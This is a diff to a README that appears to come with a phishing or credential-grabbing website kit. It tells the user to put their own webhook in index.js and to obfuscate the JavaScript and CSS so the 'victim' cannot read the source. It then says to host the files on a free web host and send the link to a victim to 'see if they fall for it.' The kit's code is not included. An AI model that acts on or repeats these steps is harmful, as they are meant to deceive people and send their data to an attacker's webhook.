@@ -1,16 +1,15 @@
 made by sigma#4268 aka xyz#7000
 i just changed my tag
+
 also this isnt dualhooked. it's open sourced and you can look through the sources of all website in the files.
 
-anyways just edit index.js and then change your webhook
 
-and then save
-
-now goto 000webhost and make a webiste and goto file manager
-I recommend to obfuscate index.js and index.css so the user can't see the source code. You can use free css and js obfuscators online
-upload index.html, index.js, style.css in file manager and save and close
-now just ask someone to goto ur website.
-done
+Instructions
+1. Change Webhook in index.js and save
+2. This is optional but I recommend you to obfuscate style.css and index.js so the victim doesn't see the source code (There are free js and css obfuscators online)
+3. Save and then make a website. (You can use https://000webhost.com if you need a free website)
+4. Goto file manager and upload index.js and index.html and style.css (Don't upload the README.txt)
+5. Save and now send the link to your victim and see if they fall for it.
 
 also dont change the names of the file or else it wont work properly
 
